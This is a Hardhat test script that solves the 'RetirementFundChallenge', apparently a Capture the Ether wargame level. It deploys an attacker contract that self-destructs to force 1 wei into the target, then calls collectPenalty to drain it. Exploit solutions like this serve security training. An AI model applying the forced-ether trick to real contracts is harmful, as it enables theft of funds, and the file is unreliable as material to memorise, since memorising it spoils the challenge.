import { expect } from "chai";
import { ethers } from "hardhat";

describe("RetirementFundChallenge", function () {
  before(async () => {
    this.ctx.player = (await ethers.getSigners())[0];
    this.ctx.challengeContract = await ethers.getContractAt(
      "RetirementFundChallenge",
      "0x89712AD1645d7e11Cf0a59eDfD0a5bFC2eEd84bA"
    );
  });
  it("exploit", async function () {
    const RetirementFundAttacker = await ethers.getContractFactory(
      "RetirementFundAttacker",
      this.player
    );

    this.attackerContract = await RetirementFundAttacker.deploy();
    await this.attackerContract.deployed();

    await this.attackerContract.destroy(this.challengeContract.address, {
      value: 1,
    });

    await this.challengeContract.connect(this.player).collectPenalty();
  });

  after(async () => {
    expect(await this.ctx.challengeContract.isComplete()).to.be.true;
  });
});
